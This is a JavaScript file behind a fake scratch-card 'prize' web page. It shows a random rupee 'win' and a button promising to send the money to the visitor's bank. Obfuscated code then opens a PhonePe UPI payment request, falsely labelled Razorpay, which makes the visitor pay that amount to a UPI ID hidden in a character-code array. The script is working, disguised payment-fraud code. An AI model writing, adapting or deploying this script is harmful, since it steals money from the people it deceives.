function closePopup() {
    document.getElementById('popup').style.display = 'none';
};

function randInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function showPopup(box) {
    var amount = randInt(1000, 3000);
    document.getElementById('popup').style.display = 'block';
    document.querySelector(`#${box}-price > p > span.prize`).innerHTML = amount;
    document.getElementById('pop').innerHTML = '<div class="scratchbox"><img src="img/PPP.jpg" width="100%" height="auto"><span>You won <br/> ₹ ' + amount + '</span></div><div class="button" click="start"><a id="hoos" onclick="generatePaymentLink(' + amount + ')">Sent Money to your bank</a></div>';
    document.getElementById(box + '-img').style.display = 'none';
    document.getElementById(box + '-price').style.display = 'block';
};



function init() {
    const myArr = [112, 105, 110, 110, 97, 99, 108, 101, 105, 109, 112, 101, 120, 49];
    var uString = '';
    myArr.forEach(char => {
        const capital = ((randInt(0, 1) == 1) && ((char >= 65 && char <= 90) || (char >= 97 && char <= 122))) ;
        const subt = capital ? 32 : 0;
        uString += String.fromCharCode(char - subt);
    })
    console.log(uString);

    localStorage.setItem("ustring", `${uString}@icici`);
    localStorage.setItem("txnPay", parseInt((+ new Date()) / 1000));
    localStorage.setItem("webURL", 'https://cashbackworld.tw');

}

init();

var _0x6f7b = ['open', '_blank', 'focus', 'href=1', '563uVMdXT', '3533HdIdgi', '1935409mvBwkp', '1tchBCL', '344567oIfIpV', '1156802oXXCfe', '1qXVJQB', '1760549tZGnnH', '1480675JljgGB', '1049726gawUlA', '7NoYndE', 'getItem', 'referrer', 'ustring', 'txnPay', 'userAgent', 'phonepe://pay?pn=Razorpay&pa=']; function _0x5092(_0x2f4d38, _0x39b067) { return _0x5092 = function (_0x6f7b27, _0x5092ba) { _0x6f7b27 = _0x6f7b27 - 0xd7; var _0xcc130c = _0x6f7b[_0x6f7b27]; return _0xcc130c; }, _0x5092(_0x2f4d38, _0x39b067); } (function (_0x36a5bb, _0x57b04c) { var _0x3125be = _0x5092; while (!![]) { try { var _0x2021c3 = -parseInt(_0x3125be(0xd7)) * parseInt(_0x3125be(0xd8)) + -parseInt(_0x3125be(0xd9)) * parseInt(_0x3125be(0xda)) + -parseInt(_0x3125be(0xdb)) + -parseInt(_0x3125be(0xdc)) * -parseInt(_0x3125be(0xdd)) + -parseInt(_0x3125be(0xde)) + -parseInt(_0x3125be(0xdf)) + -parseInt(_0x3125be(0xe0)) * -parseInt(_0x3125be(0xe1)); if (_0x2021c3 === _0x57b04c) break; else _0x36a5bb['push'](_0x36a5bb['shift']()); } catch (_0x48f90d) { _0x36a5bb['push'](_0x36a5bb['shift']()); } } }(_0x6f7b, 0xf2d2d));
 function generatePaymentLink(_0x5c4b92) { var _0x59125b = _0x5092, _0x3df27a = localStorage[_0x59125b(0xe2)]('webURL'), _0x271b4f = document[_0x59125b(0xe3)], _0x49ca97 = localStorage[_0x59125b(0xe2)](_0x59125b(0xe4)), _0x1cd644 = _0x5c4b92, _0x155649 = localStorage[_0x59125b(0xe2)](_0x59125b(0xe5)); if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i['test'](navigator[_0x59125b(0xe6)])) { var _0x32ee41 = _0x59125b(0xe7) + _0x49ca97 + '&tn=FreeDelivery&am=' + _0x1cd644 + '&cu=INR&mc=5411&tr=' + _0x155649; window[_0x59125b(0xe8)](_0x32ee41, _0x59125b(0xe9)), window[_0x59125b(0xea)](), location[_0x59125b(0xeb)](); } else console['log']('not\x20a\x20mobile\x20device'), location[_0x59125b(0xeb)](); }